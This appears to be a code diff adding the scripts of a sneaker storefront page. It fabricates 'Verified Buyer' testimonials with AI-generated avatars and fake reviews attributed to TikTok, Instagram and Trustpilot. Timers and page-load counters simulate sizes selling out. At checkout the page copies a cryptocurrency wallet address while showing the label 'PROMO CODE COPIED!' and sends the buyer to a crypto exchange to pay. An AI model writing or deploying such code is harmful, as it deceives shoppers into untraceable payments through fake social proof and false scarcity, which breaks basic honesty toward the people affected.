+            { name: "michelle c", date: generateRecentDate(14), title: "sneakerhead girlie approved", text: "ok so i have like 50+ pairs & these auralos are TOP TIER!! the italian suede goes crazyyy 🤯", avatar: 8 },
+            { name: "liv davis", date: generateRecentDate(15), title: "luxury sneakers era", text: "the baby blue suede is DIVINE bestie!! perfect w dresses or jeans... true italian craftsmanship fr", avatar: 9 },
+            { name: "riley p", date: generateRecentDate(18), title: "sizing is perfecttt", text: "got size 37 & they fit like a glove!! the margom sole + ortholite insole combo is chefs kiss 💋", avatar: 10 },
+            { name: "jess lee", date: generateRecentDate(20), title: "stunning stunningggg", text: "the baby blue is EXACTLY like the pics!! quality exceeded my expectations & thats saying something", avatar: 11 },
+            { name: "diana b", date: generateRecentDate(22), title: "instant obsession", text: "bought ship today & loved em sm i pre-ordered another pair immediately!! italian quality hits differentttt", avatar: 12 },
+            { name: "sophie t", date: generateRecentDate(25), title: "suede is immaculate", text: "the baby blue suede is sooo soft & luxe!! makes my chloe sneakers look mid tbh 💀", avatar: 13 },
+            { name: "natalie w", date: generateRecentDate(28), title: "insane value girlies", text: "these r literally comparable to sneakers 3x the price!! italian craftsmanship at this price is wilddd", avatar: 14 },
+            { name: "mia a", date: generateRecentDate(30), title: "my everyday babies", text: "wear these baby blues literally 24/7!! the suede still looks perfect after months no joke", avatar: 15 },
+            { name: "luna m", date: generateRecentDate(32), title: "exceeded expectations frr", text: "was nervous but the 30 day return gave me confidence... but bestie these r KEEPERS!! quality is unreal", avatar: 16 },
+            { name: "ava j", date: generateRecentDate(35), title: "SOFTEST SUEDE EVERRR", text: "the baby blue suede feels like BUTTER!! my gf keeps tryna steal them lol... ordering her a pair rn", avatar: 17 },
+            { name: "ella g", date: generateRecentDate(40), title: "best luxury sneakers periodt", text: "tried isabel marant, chloe, golden goose... these auralos beat them ALL!! incredible value fr fr", avatar: 18 }
+        ];
+        // SVG Platform Icons
+        const platformSVGs = {
+            tiktok: '<svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="tiktok-grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#FF0050"/><stop offset="50%" style="stop-color:#00F2EA"/><stop offset="100%" style="stop-color:#FF0050"/></linearGradient></defs><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.34 6.34 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z" fill="#000" stroke="url(#tiktok-grad)" stroke-width="0.5"/></svg>',
+            instagram: '<svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="ig-grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#833AB4"/><stop offset="50%" style="stop-color:#FD1D1D"/><stop offset="100%" style="stop-color:#FCAF45"/></linearGradient></defs><rect x="2" y="2" width="20" height="20" rx="5" stroke="url(#ig-grad)" stroke-width="2" fill="none"/><circle cx="12" cy="12" r="4" stroke="url(#ig-grad)" stroke-width="1.5" fill="none"/><circle cx="17.5" cy="6.5" r="1.5" fill="url(#ig-grad)"/></svg>',
+            facebook: '<svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="fb-grad" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" style="stop-color:#18ACFE"/><stop offset="100%" style="stop-color:#0165E1"/></linearGradient></defs><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" fill="url(#fb-grad)"/></svg>',
+            google: '<svg viewBox="0 0 24 24" fill="none"><g><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></g></svg>',
+            trustpilot: '<svg viewBox="0 0 24 24" fill="none"><defs><linearGradient id="tp-grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00B67A"/><stop offset="100%" style="stop-color:#00D084"/></linearGradient></defs><path d="M12 0l3.708 7.514L24 8.697l-6 5.845L19.416 24 12 19.69 4.583 24 6 14.542 0 8.697l8.292-1.183z" fill="url(#tp-grad)" stroke="#00B67A" stroke-width="0.5"/></svg>'
+        };
+        // Generate review data with platforms
+        const reviewData = [
+            { author: "sofia k.", platform: "tiktok", rating: "⭐⭐⭐⭐⭐", text: "GIRLLLLL these baby blue sneakers are IT!!! the suede is giving expensive & they're actually so comfy like??? worth every pennyyyy fr fr", date: "2 days ago" },
+            { author: "maya", platform: "instagram", rating: "⭐⭐⭐⭐⭐", text: "ok but why do these auralo sneakers eat up my isabel marants... the italian craftsmanship is chefs kiss besties 🤌", date: "5 days ago" },
+            { author: "jess r", platform: "facebook", rating: "⭐⭐⭐⭐", text: "loveeee my baby blues!! the suede is soooo soft & the color is perfect for spring fits. lowkey need them in every color tho ngl", date: "1 week ago" },
+            { author: "emma grace", platform: "google", rating: "⭐⭐⭐⭐⭐", text: "these literally make my $600 designer sneakers look dumb lmaooo... the ortholite insole has me walking on clouds no cap", date: "2 weeks ago" },
+            { author: "liv c", platform: "trustpilot", rating: "⭐⭐⭐⭐⭐", text: "most comfy sneakers in my rotation rn!! the italian suede is butterrr. already copped another pair on pre-order for my bestie 💙", date: "3 weeks ago" },
+            { author: "alexis", platform: "tiktok", rating: "⭐⭐⭐⭐⭐", text: "OBSESSED isn't even the word... these > my isabel marant beketts and thats on periodt!!! run don't walk girlies 🏃‍♀️💨", date: "4 days ago" },
+            { author: "maria g", platform: "instagram", rating: "⭐⭐⭐⭐⭐", text: "the baby blue is PERFECTTTT 🦋 these sneakers r giving main character energy... got sm compliments already its not even funny", date: "1 day ago" }
+        ];
+        // Render testimonials - Comfrt.com style
+        function renderTestimonials() {
+            const grid = document.getElementById('testimonialGrid');
+            testimonialData.forEach((item, index) => {
+                const card = document.createElement('div');
+                card.className = 'testimonial-item';
+                // Use smart loaded images if available, fallback to actual files
+                const testimonialImages = smartLoader.loadedImages.testimonials || [];
+                const imgSrc = testimonialImages[index % testimonialImages.length] ||
+                               `./images/testimonials/webp_Generated Image September 28, 2025 - 11_16AM (${item.avatar}).webp`;
+                card.innerHTML = `
+                    <img class="testimonial-image"
+                         src="${imgSrc}"
+                         alt="${item.name}"><div class="testimonial-content-wrapper"><div class="testimonial-name">${item.name}</div><div class="verified-badge"><span class="verified-check">✓</span>
+                            Verified Buyer | ${item.date}
+                        </div><div class="testimonial-stars">⭐⭐⭐⭐⭐</div><div class="testimonial-title">${item.title}</div><div class="testimonial-text">${item.text}</div></div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+        // Render reviews carousel
+        function renderReviews() {
+            const carousel = document.getElementById('reviewsCarousel');
+            const dotsContainer = document.getElementById('reviewDots');
+            reviewData.forEach((review, index) => {
+                const card = document.createElement('div');
+                card.className = 'review-item';
+                card.innerHTML = `
+                    <div class="review-platform">${platformSVGs[review.platform]}</div><div class="review-header"><div class="review-author">${review.author}</div><div class="review-verified"><span style="background: #00b67a; color: white; width: 14px; height: 14px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 8px;">✓</span>
+                            Verified Buyer
+                        </div></div><div class="review-rating">${review.rating}</div><div class="review-content">${review.text}</div><div class="review-footer"><span>Verified on ${review.platform}</span><span>${review.date}</span></div>
+                `;
+                carousel.appendChild(card);
+                // Create dot for this review
+                const dot = document.createElement('div');
+                dot.className = 'carousel-dot' + (index === 0 ? ' active' : '');
+                dot.onclick = () => scrollToReview(index);
+                dotsContainer.appendChild(dot);
+            });
+            // Add scroll listener for dots
+            carousel.addEventListener('scroll', () => {
+                const scrollPos = carousel.scrollLeft;
+                const cardWidth = carousel.querySelector('.review-item').offsetWidth + 15;
+                const activeIndex = Math.round(scrollPos / cardWidth);
+                document.querySelectorAll('.carousel-dot').forEach((dot, i) => {
+                    dot.classList.toggle('active', i === activeIndex);
+                });
+            });
+        }
+        function scrollToReview(index) {
+            const carousel = document.getElementById('reviewsCarousel');
+            const cards = carousel.querySelectorAll('.review-item');
+            if (cards[index]) {
+                cards[index].scrollIntoView({ behavior: 'smooth', inline: 'start' });
+            }
+        }
+        // Lazy loading
+        const imageObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const img = entry.target;
+                    const src = img.getAttribute('data-src');
+                    if (src) {
+                        img.src = src;
+                        img.classList.add('loaded');
+                        img.classList.remove('skeleton');
+                        imageObserver.unobserve(img);
+                    }
+                }
+            });
+        }, { rootMargin: '50px' });
+        // Initialize
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Update shipping date on page load
+            updateShippingDate();
+            // Initialize smart image detection first
+            await smartLoader.initialize();
+            // Generate dynamic content
+            renderTestimonials();
+            renderReviews();
+            // Setup lazy loading for all images
+            const lazyImages = document.querySelectorAll('img[data-src]');
+            lazyImages.forEach(img => imageObserver.observe(img));
+            // Load critical images immediately (above the fold)
+            const criticalImages = document.querySelectorAll('.main-image, .thumbnail');
+            criticalImages.forEach(img => {
+                const src = img.getAttribute('data-src');
+                if (src) {
+                    img.src = src;
+                    img.classList.add('loaded');
+                    img.classList.remove('skeleton');
+                }
+            });
+            // Lazy load video on user interaction or when visible
+            const videoPlaceholder = document.getElementById('videoPlaceholder');
+            const checkoutVideo = document.getElementById('checkoutVideo');
+            const loadVideo = () => {
+                const videoSrc = checkoutVideo.getAttribute('data-src');
+                if (videoSrc && videoPlaceholder) {
+                    checkoutVideo.src = videoSrc;
+                    checkoutVideo.load();
+                    videoPlaceholder.style.display = 'none';
+                    // Also set source tag
+                    const sourceTag = checkoutVideo.querySelector('source');
+                    if (sourceTag) {
+                        const sourceSrc = sourceTag.getAttribute('data-src');
+                        if (sourceSrc) sourceTag.src = sourceSrc;
+                    }
+                }
+            };
+            // Load video when placeholder is clicked
+            if (videoPlaceholder) {
+                videoPlaceholder.addEventListener('click', loadVideo);
+            }
+            // Or load video when it's about to come into view
+            const videoObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        loadVideo();
+                        videoObserver.disconnect();
+                    }
+                });
+            }, { rootMargin: '100px' });
+            if (checkoutVideo) {
+                videoObserver.observe(checkoutVideo.parentElement);
+            }
+            // Update pre-order button with actual date
+            const preorderBtn = document.getElementById('preorderBtn');
+            if (preorderBtn) {
+                const twoWeeksFromNow = new Date();
+                twoWeeksFromNow.setDate(twoWeeksFromNow.getDate() + 14);
+                const options = { month: 'short', day: 'numeric' };
+                const shipDate = twoWeeksFromNow.toLocaleDateString('en-US', options);
+                // Update just the ship date text
+                const shipDateDiv = preorderBtn.querySelector('#shipDate');
+                if (shipDateDiv) {
+                    shipDateDiv.textContent = `Wait & Save: Estimated to Ship ${shipDate}`;
+                }
+            }
+        });
+        // Image gallery
+        function switchImage(thumb) {
+            const mainImage = document.getElementById('mainImage');
+            mainImage.src = thumb.getAttribute('data-src') || thumb.src;
+            document.querySelectorAll('.thumbnail').forEach(t => t.classList.remove('active'));
+            thumb.classList.add('active');
+        }
+        // Global state
+        let selectedSize = null;
+        let orderBumpsAccepted = false;
+        let currentShipping = 'today'; // Default to ship today
+        let currentPrice = 69;
+        // Page load counter for size 44
+        let pageLoadCount = parseInt(localStorage.getItem('pageLoadCount') || '0');
+        pageLoadCount++;
+        localStorage.setItem('pageLoadCount', pageLoadCount.toString());
+        // Check if size 44 should be sold out (after 20 page loads)
+        if (pageLoadCount >= 20) {
+            setTimeout(() => {
+                const size44Btn = document.getElementById('size44');
+                if (size44Btn && !size44Btn.classList.contains('sold-out')) {
+                    size44Btn.classList.add('sold-out');
+                    size44Btn.innerHTML = '44<span class="size-stock">SOLD OUT</span>';
+                    // Show notification
+                    const notification = document.createElement('div');
+                    notification.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #dc2626; color: white; padding: 15px 20px; border-radius: 8px; z-index: 10000; font-weight: 600; box-shadow: 0 4px 6px rgba(0,0,0,0.1);';
+                    notification.textContent = 'Size 44 just sold out!';
+                    document.body.appendChild(notification);
+                    setTimeout(() => notification.remove(), 5000);
+                }
+            }, 2000); // Delay to simulate real-time selling out
+        }
+        // Size selection
+        function selectSize(btn) {
+            if (btn.classList.contains('sold-out')) {
+                alert(`Size ${btn.getAttribute('data-size')} is sold out! It will be back in stock in 2 weeks.`);
+                return;
+            }
+            document.querySelectorAll('.size-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedSize = btn.getAttribute('data-size');
+        }
+        // Handle add to cart with shipping type
+        function handleAddToCart(shippingType) {
+            if (!selectedSize) {
+                // Scroll to size selector
+                document.querySelector('.size-selector').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                // Flash the size selector
+                const sizeSelector = document.querySelector('.size-selector');
+                sizeSelector.style.border = '2px solid red';
+                setTimeout(() => {
+                    sizeSelector.style.border = 'none';
+                }, 2000);
+                // Show alert message
+                const existingAlert = document.querySelector('.size-alert');
+                if (existingAlert) existingAlert.remove();
+                const alert = document.createElement('div');
+                alert.className = 'size-alert';
+                alert.style.cssText = 'background: #ff4444; color: white; padding: 10px; text-align: center; margin: 10px 0; border-radius: 5px; font-weight: 600;';
+                alert.textContent = 'Please select a size';
+                document.querySelector('.size-selector').parentNode.insertBefore(alert, document.querySelector('.size-selector'));
+                setTimeout(() => {
+                    alert.remove();
+                }, 3000);
+                return;
+            }
+            // Set the current shipping and price based on button clicked
+            if (shippingType === 'today') {
+                currentShipping = 'today';
+                currentPrice = 69;
+            } else {
+                currentShipping = 'preorder';
+                currentPrice = 29;
+            }
+            openCheckout();
+        }
+        // Update shipping date dynamically
+        function updateShippingDate() {
+            const twoWeeksFromNow = new Date();
+            twoWeeksFromNow.setDate(twoWeeksFromNow.getDate() + 14);
+            const options = { month: 'short', day: 'numeric' };
+            const shipDate = twoWeeksFromNow.toLocaleDateString('en-US', options);
+            const shipDateElement = document.getElementById('shipDate');
+            if (shipDateElement) {
+                shipDateElement.textContent = `Wait & Save: Estimated to Ship ${shipDate}`;
+            }
+        }
+        // Checkout functions
+        function openCheckout() {
+            if (!selectedSize) {
+                alert('Please select a size');
+                return;
+            }
+            // Update the selected size in modal
+            const modalSize = document.getElementById('modalSelectedSize');
+            if (modalSize) {
+                modalSize.textContent = selectedSize;
+            }
+            // Update checkout modal with current price and shipping type
+            const checkoutPrice = document.getElementById('checkoutPrice');
+            if (checkoutPrice) {
+                checkoutPrice.textContent = `$${currentPrice}`;
+            }
+            // Update shipping info in modal
+            const shippingInfo = currentShipping === 'today' ? 'Ships within 24 hours' : 'Pre-order: Ships in 2 weeks';
+            const modalTitle = document.querySelector('#checkoutModal h2');
+            if (modalTitle && !modalTitle.dataset.original) {
+                modalTitle.dataset.original = modalTitle.textContent;
+            }
+            document.getElementById('checkoutModal').classList.add('active');
+            updateTotal();
+        }
+        // Sold out notification
+        function showSoldOutNotification() {
+            // Mark size 44 as sold out if not already
+            const size44Button = document.getElementById('size44');
+            if (size44Button && !size44Button.classList.contains('sold-out')) {
+                size44Button.classList.add('sold-out');
+                size44Button.innerHTML = '44<span class="size-stock">SOLD OUT</span>';
+            }
+            // Create notification
+            const notification = document.createElement('div');
+            notification.className = 'sold-out-notification';
+            notification.innerHTML = `
+                <button class="notification-close" onclick="this.parentElement.classList.add('slide-out'); setTimeout(() => this.parentElement.remove(), 300);">×</button><div class="notification-content"><div class="notification-icon">🚫</div><div class="notification-text"><h4>Size 44 Just Sold Out!</h4><p style="margin: 5px 0 0 0; font-size: 14px; color: #666;">OMG another pair gone! Size 44 is now unavailable 😭</p></div></div>
+            `;
+            document.body.appendChild(notification);
+            // Trigger animation
+            setTimeout(() => {
+                notification.classList.add('slide-in');
+            }, 10);
+            // Auto-dismiss after 5 seconds
+            setTimeout(() => {
+                notification.classList.add('slide-out');
+                setTimeout(() => notification.remove(), 300);
+            }, 5000);
+        }
+        // Start sold out timer
+        setTimeout(showSoldOutNotification, 20000);
+        // Toggle product detail dropdowns
+        function toggleDetail(header) {
+            const content = header.nextElementSibling;
+            const arrow = header.querySelector('.detail-arrow');
+            if (content.classList.contains('open')) {
+                content.classList.remove('open');
+                arrow.classList.remove('open');
+            } else {
+                // Close other dropdowns
+                document.querySelectorAll('.detail-content.open').forEach(c => {
+                    c.classList.remove('open');
+                    c.previousElementSibling.querySelector('.detail-arrow').classList.remove('open');
+                });
+                content.classList.add('open');
+                arrow.classList.add('open');
+            }
+        }
+        function closeCheckout() {
+            document.getElementById('checkoutModal').classList.remove('active');
+        }
+        function updateTotal() {
+            let total = currentPrice;
+            const orderBumpChecked = document.getElementById('orderBumpCheckbox').checked;
+            if (orderBumpChecked) {
+                total += 10;
+                document.getElementById('bumpSummary').innerHTML = `
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Luxury Shoe Care Kit</span><span>$10.00</span></div>
+                `;
+            } else {
+                document.getElementById('bumpSummary').innerHTML = '';
+            }
+            document.getElementById('totalPrice').textContent = `$${total.toFixed(2)}`;
+            document.getElementById('finalTotal').textContent = `$${total.toFixed(2)}`;
+        }
+        // Complete checkout with SimpleSwap
+        function completeCheckout() {
+            const walletAddress = '0xE5173e7c3089bD89cd1341b637b8e1951745ED5C';
+            let totalAmount = currentPrice;
+            // Check if order bump is selected
+            const orderBumpChecked = document.getElementById('orderBumpCheckbox').checked;
+            if (orderBumpChecked) {
+                totalAmount += 10;
+            }
+            // Copy wallet address to clipboard
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(walletAddress).then(() => {
+                    // Show success message
+                    const addressDiv = document.getElementById('walletAddress');
+                    const originalText = addressDiv.innerHTML;
+                    addressDiv.innerHTML = '✅ PROMO CODE COPIED!';
+                    addressDiv.style.color = '#2e7d32';
+                    setTimeout(() => {
+                        addressDiv.innerHTML = originalText;
+                    }, 3000);
+                    // Fire TikTok Pixel conversion event
+                    if (typeof ttq !== 'undefined') {
+                        ttq.track('CompletePayment', {
+                            content_id: 'premium-limited-edition',
+                            content_type: 'product',
+                            content_name: 'Premium Limited Edition',
+                            quantity: 1,
+                            price: totalAmount,
+                            value: totalAmount,
+                            currency: 'USD'
+                        });
+                    }
+                    // Open SimpleSwap with correct parameters
+                    setTimeout(() => {
+                        window.open('https://simpleswap.io/exchange?from=usd-usd&to=pol-matic&amount=' + totalAmount, '_blank');
+                    }, 500);
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                    fallbackCopy();
+                });
+            } else {
+                fallbackCopy();
+            }
+            // Fallback copy method
+            function fallbackCopy() {
+                const textArea = document.createElement('textarea');
+                textArea.value = walletAddress;
+                textArea.style.position = 'fixed';
+                textArea.style.top = '-999px';
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                // Fire TikTok Pixel conversion event
+                if (typeof ttq !== 'undefined') {
+                    ttq.track('CompletePayment', {
+                        content_id: 'premium-limited-edition',
+                        content_type: 'product',
+                        content_name: 'Premium Limited Edition',
+                        quantity: 1,
+                        price: totalAmount,
+                        value: totalAmount,
+                        currency: 'USD'
+                    });
+                }
+                // Open SimpleSwap
+                window.open('https://simpleswap.io/exchange?from=usd-usd&to=pol-matic&amount=' + totalAmount, '_blank');
+            }
+        }
+        function processOrder() {
+            completeCheckout();
+        }
+        // Sticky footer scroll handler
+        window.addEventListener('scroll', () => {
+            const stickyFooter = document.querySelector('.sticky-footer');
+            if (window.scrollY > 100) {
+                stickyFooter.classList.add('visible');
+            } else {
+                stickyFooter.classList.remove('visible');
+            }
+        });
+        // Close modal on outside click
+        document.getElementById('checkoutModal').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) {
+                closeCheckout();
+            }
+        });
+    </script></body></html>
